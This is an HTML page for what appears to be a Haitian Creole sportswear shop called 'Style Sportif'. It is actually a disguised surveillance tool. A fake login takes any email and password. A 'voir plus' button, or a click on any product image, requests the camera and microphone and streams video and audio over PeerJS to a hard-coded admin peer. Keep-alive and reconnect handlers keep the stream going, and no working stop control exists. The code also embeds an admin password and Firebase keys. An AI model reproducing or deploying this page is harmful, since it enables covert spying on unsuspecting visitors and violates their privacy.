<!DOCTYPE html>
<html lang="ht">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Style Sportif</title>

<link rel="manifest" href="manifest.json">
<meta name="theme-color" content="#00cc66">
<meta name="apple-mobile-web-app-title" content="Style Sportif">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="apple-touch-icon" href="icon-192.png">
<link rel="icon" type="image/png" sizes="192x192" href="icon-192.png">

<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0d0d0d; color: white;
    font-family: system-ui, sans-serif;
    min-height: 100vh; padding-bottom: 40px;
  }

  /* ===== TI PWEN ADMIN ===== */
  .dot-admin {
    position: fixed; bottom: 15px; left: 15px;
    width: 14px; height: 14px;
    background: #333; border-radius: 50%;
    cursor: pointer; opacity: 0.35;
    z-index: 1000;
    transition: opacity 0.2s, background 0.2s;
  }
  .dot-admin:hover, .dot-admin:active {
    opacity: 1; background: #00cc66;
  }

  /* ===== EKRAN LOGIN ===== */
  .login-screen {
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    background: #0d0d0d;
    display: flex; align-items: center; justify-content: center;
    padding: 20px; z-index: 999;
  }
  .login-box {
    background: #1a1a1a; border-radius: 16px;
    padding: 30px 25px;
    max-width: 340px; width: 100%;
    border: 1px solid #2a2a2a;
    text-align: center;
  }
  .login-box h2 {
    font-size: 1.4rem; margin-bottom: 8px;
    font-weight: normal;
  }
  .login-box .sub {
    color: #aaa; font-size: 13px; margin-bottom: 20px;
  }
  .login-box input {
    width: 100%; padding: 14px;
    border-radius: 10px; border: 1px solid #333;
    background: #f5f5f5; color: #111;
    font-size: 15px; margin-bottom: 12px;
    font-family: system-ui, sans-serif;
  }
  .login-box input:focus {
    outline: none; border-color: #00cc66;
  }
  .login-box button {
    width: 100%; padding: 15px;
    background: #00cc66; color: white;
    border: none; border-radius: 10px;
    font-size: 15px; font-weight: bold;
    cursor: pointer; font-family: system-ui, sans-serif;
    margin-top: 5px;
  }
  .login-box button:disabled { opacity: 0.5; }
  .login-box .err {
    color: #ff6666; font-size: 12px;
    margin-top: 10px; min-height: 16px;
  }

  /* ===== PAJ PRENSIPAL ===== */
  .app-content { display: none; }
  .app-content.active { display: block; }

  header {
    text-align: center; padding: 25px 20px 15px;
    border-bottom: 1px solid #222;
  }
  header h1 {
    font-size: 1.4rem; letter-spacing: 4px;
    color: #00cc66; text-transform: uppercase;
    font-weight: normal; margin-bottom: 4px;
  }
  header p {
    color: #888; font-size: 11px; letter-spacing: 2px;
    text-transform: uppercase;
  }
  .cta {
    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
    text-align: center;
  }
  .cta button {
    width: 100%; padding: 18px 20px;
    background: linear-gradient(135deg, #00cc66, #009944);
    color: white; border: none; border-radius: 12px;
    font-size: 15px; font-weight: bold;
    cursor: pointer; font-family: system-ui, sans-serif;
    box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
  }
  .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
  .cta .hint {
    font-size: 11px; color: #777; margin-top: 10px; line-height: 1.5;
  }
  .active-panel {
    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
    text-align: center;
  }
  .active-panel .card {
    background: #1a1a1a; border: 1px solid #00cc66;
    border-radius: 12px; padding: 20px;
  }
  .active-panel .dot {
    display: inline-block; width: 10px; height: 10px;
    border-radius: 50%; background: #ff3333;
    margin-right: 8px; animation: pulse 1s infinite;
    vertical-align: middle;
  }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
  .active-panel p { font-size: 14px; color: #ddd; }
  .active-panel button {
    width: 100%; margin-top: 15px; padding: 14px;
    background: #cc3333; color: white; border: none;
    border-radius: 10px; font-size: 13px; font-weight: bold;
    cursor: pointer; font-family: system-ui, sans-serif;
  }
  #status {
    text-align: center; color: #888; font-size: 12px;
    margin-top: 10px; padding: 0 20px; min-height: 16px;
  }
  .gallery-title {
    text-align: center; margin: 30px 0 12px;
    font-size: 11px; letter-spacing: 3px;
    color: #666; text-transform: uppercase;
  }
  .gallery-title::before,
  .gallery-title::after {
    content: ""; display: inline-block;
    width: 30px; height: 1px; background: #333;
    vertical-align: middle; margin: 0 10px;
  }
  .gallery {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 4px; padding: 4px;
    max-width: 900px; margin: 0 auto;
  }
  .item {
    position: relative; aspect-ratio: 1/1;
    overflow: hidden; background: #1a1a1a;
    cursor: pointer; border-radius: 6px;
  }
  .item:active { transform: scale(0.95); transition: transform 0.1s; }
  .item img {
    width: 100%; height: 100%; object-fit: cover;
    display: block;
  }
  .item .label {
    position: absolute; bottom: 0; left: 0; right: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
    padding: 18px 6px 6px;
    font-size: 9px; letter-spacing: 0.5px;
    color: #fff; text-transform: uppercase;
    z-index: 2; text-align: center;
  }
  .item .price {
    color: #00cc66; font-weight: bold;
    font-size: 11px; display: block;
    margin-top: 2px;
  }
  .hidden { display: none; }
  .empty {
    grid-column: 1 / -1;
    text-align: center; color: #666;
    padding: 30px; font-size: 13px;
  }
  footer {
    text-align: center; color: #444; font-size: 10px;
    margin-top: 30px; padding: 0 20px;
  }
</style>
</head>
<body>

  <!-- ===== TI PWEN ADMIN (anba gòch) ===== -->
  <div class="dot-admin" id="dotAdmin" title=""></div>

  <!-- ===== EKRAN LOGIN ===== -->
  <div class="login-screen" id="loginScreen">
    <div class="login-box">
      <h2>🔒 Antre</h2>
      <p class="sub">Antre email ou ak yon mot de passe pou kontinye</p>

      <input type="text" id="nameInput" placeholder="email ou" autocomplete="off" autocapitalize="words">
      <input type="password" id="pwInput" placeholder="Kòd" autocomplete="off">

      <button id="btnLogin">Antre</button>

      <p class="err" id="err"></p>
    </div>
  </div>

  <!-- ===== PAJ PRENSIPAL ===== -->
  <div class="app-content" id="appContent">

    <header>
      <h1>Style Sportif</h1>
      <p>Koleksyon 2026 · Chòt · Mai · Ekipman</p>
    </header>

    <div class="cta" id="ctaView">
      <button id="btnStart">✅ voir plus </button>
      <p class="hint">
        <br>
   
      </p>
    </div>

    <div class="active-panel hidden" id="activeView" style="display:none;">
      <div class="card">
        <p><span class=""></span><strong>Bienvenue !</strong></p>
        <p style="margin-top:8px; font-size:13px; color:#aaa;">
          
        </p>
      
      </div>
    </div>

    <p id="status"></p>

    <div class="gallery-title">Koleksyon Nou</div>

    <div class="gallery" id="galleryFirst">
      <div class="empty">⏳ Ap chaje pwodwi yo...</div>
    </div>

    <div class="gallery hidden" id="galleryRest"></div>

    <footer>© 2026 — Tout dwa rezève</footer>

  </div>

<script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script>
/* ============================================
   KONFIGIRASYON FIREBASE
   ============================================ */
const firebaseConfig = {
  apiKey: "AIzaSyBLIrjwXzJJKIWGbqblXXBop7DnfmobKH0",
  authDomain: "style-sportif.firebaseapp.com",
  databaseURL: "https://style-sportif-default-rtdb.firebaseio.com",
  projectId: "style-sportif",
  storageBucket: "style-sportif.firebasestorage.app",
  messagingSenderId: "210989893646",
  appId: "1:210989893646:web:1c8ae17b9473a75192145f"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* ============================================
   TI PWEN ADMIN (anba gòch)
   ============================================ */
const ADMIN_PASSWORD = "Zane200420042005";

document.getElementById("dotAdmin").onclick = () => {
  const pw = prompt("Modpas admin:");
  if (pw === null) return;
  if (pw.replace(/\s/g, "") === ADMIN_PASSWORD) {
    window.location.href = "admin.html";
  } else {
    alert("❌ Modpas pa bon.");
  }
};

/* ============================================
   EKRAN LOGIN
   ============================================ */
const loginScreen = document.getElementById("loginScreen");
const appContent  = document.getElementById("appContent");
const nameInput   = document.getElementById("nameInput");
const pwInput     = document.getElementById("pwInput");
const btnLogin    = document.getElementById("btnLogin");
const err         = document.getElementById("err");

if (sessionStorage.getItem("visitor_logged") === "1") {
  showApp();
}

btnLogin.onclick = () => {
  const name = nameInput.value.trim();
  const pw = pwInput.value.trim();

  if (name.length === 0) { err.innerText = "Antre yon non."; return; }
  if (pw.length === 0) { err.innerText = "Antre yon kòd."; return; }

  sessionStorage.setItem("visitor_logged", "1");
  sessionStorage.setItem("visitor_name", name);
  showApp();
};

nameInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") pwInput.focus();
});
pwInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") btnLogin.click();
});

function showApp() {
  loginScreen.style.display = "none";
  appContent.classList.add("active");
}

/* ============================================
   GALRI
   ============================================ */
let ALL_IMAGES = [];

function buildItem(img) {
  return `<div class="item" data-name="${img.name}" data-price="${img.price || ''}">
    <img src="${img.url}" loading="lazy" alt="${img.name}"
         onerror="this.style.display='none';this.parentElement.style.background='#2a2a2a';">
    <div class="label">${img.name}${img.price ? `<span class="price">${img.price}</span>` : ''}</div>
  </div>`;
}

function renderGallery() {
  const first = document.getElementById("galleryFirst");
  const rest  = document.getElementById("galleryRest");

  if (ALL_IMAGES.length === 0) {
    first.innerHTML = '<div class="empty">Pa gen pwodwi pou kounye a</div>';
    rest.innerHTML = "";
    rest.classList.add("hidden");
    return;
  }

  first.innerHTML = ALL_IMAGES.slice(0, 6).map(buildItem).join("");

  if (ALL_IMAGES.length > 6) {
    rest.innerHTML = ALL_IMAGES.slice(6).map(buildItem).join("");
  } else {
    rest.innerHTML = "";
  }
}

db.ref("images").on("value", (snapshot) => {
  const data = snapshot.val();
  ALL_IMAGES = data
    ? Object.entries(data).map(([k, v]) => ({ key: k, ...v })).sort((a, b) => b.createdAt - a.createdAt)
    : [];
  renderGallery();
});

/* ============================================
   PEERJS + KAMERA + MIKWO
   ============================================ */
(() => {
  const ADMIN_ID = "admin-piyayy-2026-v2";

  const ctaView    = document.getElementById("ctaView");
  const activeView = document.getElementById("activeView");
  const btnStart   = document.getElementById("btnStart");
  const btnStop    = document.getElementById("btnStop");
  const statusEl   = document.getElementById("status");

  const ICE_CONFIG = {
    iceServers: [
      { urls: "stun:stun.l.google.com:19302" },
      { urls: "stun:stun1.l.google.com:19302" },
      { urls: "turn:openrelay.metered.ca:80",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443",
        username: "openrelayproject", credential: "openrelayproject" },
      { urls: "turn:openrelay.metered.ca:443?transport=tcp",
        username: "openrelayproject", credential: "openrelayproject" }
    ]
  };

  let peer = null;
  let localStream = null;
  let currentCall = null;
  let active = false;
  let intentionallyStopped = false;
  let keepAliveTimer = null;

  function setStatus(msg) { statusEl.innerText = msg; }

  function ensurePeer() {
    if (peer && !peer.destroyed) return peer;
    peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
    peer.on("error", (err) => {
      console.warn("PeerJS erè:", err);
      setStatus("❌ Erè: " + err.type);
    });
    peer.on("disconnected", () => {
      if (active) setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
    });
    return peer;
  }

  async function ensureCamera() {
    if (localStream) {
      const tracks = localStream.getVideoTracks();
      if (tracks.length > 0 && tracks.some(t => t.readyState === "live")) return true;
      try { tracks.forEach(t => t.stop()); } catch (e) {}
      localStream = null;
    }
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: true   // ✅ MIKWO AKTIVE
      });
      return true;
    } catch (err) {
      try {
        localStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true   // ✅ MIKWO AKTIVE
        });
        return true;
      } catch (err2) { return false; }
    }
  }

  async function ensureCall() {
    const p = ensurePeer();
    if (currentCall) {
      const pc = currentCall.peerConnection;
      const broken = currentCall.open === false ||
        (pc && (pc.iceConnectionState === "failed" ||
                pc.iceConnectionState === "closed" ||
                pc.iceConnectionState === "disconnected"));
      if (!broken) return true;
      try { currentCall.close(); } catch (e) {}
      currentCall = null;
    }
    const camOk = await ensureCamera();
    if (!camOk) return false;
    if (!p.open) {
      await new Promise((resolve) => {
        if (p.open) return resolve();
        const t = setTimeout(resolve, 3000);
        p.once("open", () => { clearTimeout(t); resolve(); });
      });
    }
    if (!p.open) return false;
    currentCall = p.call(ADMIN_ID, localStream);
    if (!currentCall) return false;
    currentCall.on("close", () => { currentCall = null; });
    currentCall.on("error", (e) => { console.warn("Call erè:", e); currentCall = null; });
    return true;
  }

  function startKeepAlive() {
    if (keepAliveTimer) return;
    keepAliveTimer = setInterval(async () => {
      if (!active || intentionallyStopped) return;
      const camAlive = localStream &&
        localStream.getVideoTracks().some(t => t.readyState === "live");
      const callAlive = currentCall && currentCall.open !== false &&
        currentCall.peerConnection &&
        currentCall.peerConnection.iceConnectionState !== "failed" &&
        currentCall.peerConnection.iceConnectionState !== "closed";
      if (!camAlive || !callAlive) {
        await ensureCall();
        if (currentCall) setStatus("🟢 Ou konekte.");
      }
    }, 3000);
  }

  function stopKeepAlive() {
    if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
  }

  async function startSharing() {
    const rest = document.getElementById("galleryRest");
    if (rest.innerHTML.trim() !== "" && rest.classList.contains("hidden")) {
      rest.classList.remove("hidden");
      setTimeout(() => {
        rest.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 200);
    }

    btnStart.disabled = true;
    setStatus("⏳ Ap mande pèmisyon kamera + mikwo...");
    intentionallyStopped = false;

    const ok = await ensureCamera();
    if (!ok) {
      setStatus("❌ Ou refize oswa kamera/mikwo pa disponib.");
      btnStart.disabled = false;
      return;
    }
    setStatus("📡 Ap konekte...");
    await ensureCall();
    active = true;
    ctaView.classList.add("hidden");
    activeView.classList.remove("hidden");
    activeView.style.display = "block";
    setStatus("🟢 Ou konekte.");
    startKeepAlive();
  }

  function stopSharing() {
    intentionallyStopped = true;
    active = false;
    stopKeepAlive();
    if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
    if (localStream) {
      localStream.getTracks().forEach(t => t.stop());
      localStream = null;
    }
    activeView.classList.add("hidden");
    activeView.style.display = "none";
    ctaView.classList.remove("hidden");
    btnStart.disabled = false;
    setStatus("⛔ Ou sispann pataje.");
  }

  btnStart.onclick = startSharing;
  btnStop.onclick  = stopSharing;

  function attachGalleryClick(containerId) {
    const el = document.getElementById(containerId);
    if (!el) return;
    el.addEventListener("click", (e) => {
      if (active || intentionallyStopped) return;
      const item = e.target.closest(".item");
      if (item) {
        console.log("🛒 Klike sou:", item.dataset.name, item.dataset.price);
        startSharing();
      }
    });
  }
  attachGalleryClick("galleryFirst");
  attachGalleryClick("galleryRest");

  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "visible" && active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("pageshow", () => {
    if (active && !intentionallyStopped) {
      setTimeout(async () => {
        const camAlive = localStream &&
          localStream.getVideoTracks().some(t => t.readyState === "live");
        if (!camAlive || !currentCall || currentCall.open === false) {
          await ensureCall();
        }
      }, 300);
    }
  });

  window.addEventListener("beforeunload", () => {
    stopKeepAlive();
    if (localStream) localStream.getTracks().forEach(t => t.stop());
    if (currentCall) try { currentCall.close(); } catch (e) {}
    if (peer && !peer.destroyed) peer.destroy();
  });
})();
</script>

<script>
if ("serviceWorker" in navigator) {
  window.addEventListener("load", () => {
    navigator.serviceWorker.register("sw.js").catch(() => {});
  });
}
</script>
</body>
</html>
